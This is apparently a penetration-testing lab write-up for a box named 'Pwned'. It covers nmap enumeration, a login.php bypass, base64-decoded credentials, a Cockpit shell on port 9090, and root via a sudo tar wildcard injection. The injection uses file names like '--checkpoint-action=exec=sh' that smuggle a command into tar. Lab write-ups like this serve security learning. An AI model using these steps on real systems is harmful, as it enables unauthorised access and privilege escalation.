
#Pwned
```IP
192.168.232.10
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.232.10 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                       
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmPOfERLKCxx+ufQz7eRTNuEEkJ+GX/hKPNPpCWlTiTgegmjYoXQ7MA5ibTRoJ6vxpPEggzNszJKbBrSVAbRuT2sBg4o7ywiGUy7vsDBpObMrBMsdKuue3gpkaNF8DL2pB3v/XAxtavq1Mh4vz4yj99cc2pX1GhSjpQTWlsK8Rl9DmBKp7t0XxEWwq3juQ9JiN5
yAttMrbTDjwMNxcipsYv0pMudDBE6g4gQyiZGwuUfBn+HirxnfRr7KkxmBaEpZgukXSJ7fXYgpQVgNP2cvd2sy/PYe0kL7lOfYwG/DSLWV917RPIdsPPQYr+rqrBL7XQA2Qll30Ms9iAX1m9S6pT/vkaw6JQCgDwFSwPXrknf627jCS7vQ8mh8UL07nPO7Hkko3fnHIcxyJggi/BoAAi3GseOl7vCZl28+waWlNdbR8
gaiZhDR1rLvimcm3pg3nv9m+0qfVRIs9fxq97cOEFeXhaGHXvQL6LYGK14ZG+jVXtPavID6txymiBOUsj8M=
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAweAzke7+zPt3Untb06RlI4MEp+vsEJICUG+0GgPMp+vxOdxEhcsVY0VGyuC+plTRlqNi0zNv1Y0Jj0BYRMSUw=
|   256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)        
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJP5z2Scxa02tfhI1SClflg5QtVdhMImHwY7GugVtfY
80/tcp   open  http            syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD                                                                         
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Looks like our target system is running an Ubuntu 20.04.6 LTS

## HTTP 80
apache 2.4.41
```
login.php
logout.php
blocked.html
db_config.php
```

## HTTP 9090
server blaze
# Exploitation
in /login.php we can get in as admin:''
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125090028.png?raw=true)
we can convert them with
```
echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy'  | base64 -d
```
we seem to have a set of credentials
```
james:canttouchhhthiss@455152
```
```
cameron:thisscanttbetouchedd@455152
```
we aren't able to SSH with either of them but we can use them on the blaze server in 9090

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124180708.png?raw=true)
we can enter with james:canttouchhhthiss@455152
we get cockpit version 215
we have a terminal and we can get initial foothold
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125091617.png?raw=true)

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125091922.png?raw=true)
```
sudo -l
```
it seems like we have access to this command
```
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
we search how to scape it in GTFObins
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094214.png?raw=true)
we need 2 files with names as the highlighted parameters in order to tar to execute them
we create 2 files as follows in /tmp:
```
echo '' > /tmp/'--checkpoint=1'
```
eventhough we can't create files with a '/' character, we have sh in path so we could create the other file as follows:
```
touch ./'--checkpoint-action=exec=sh'
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094048.png?raw=true)

when executing the command we gain root access
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241125094004.png?raw=true)
we now have proof.txt

## Automated

### Peass
### Mimikatz

# Lateral Movement

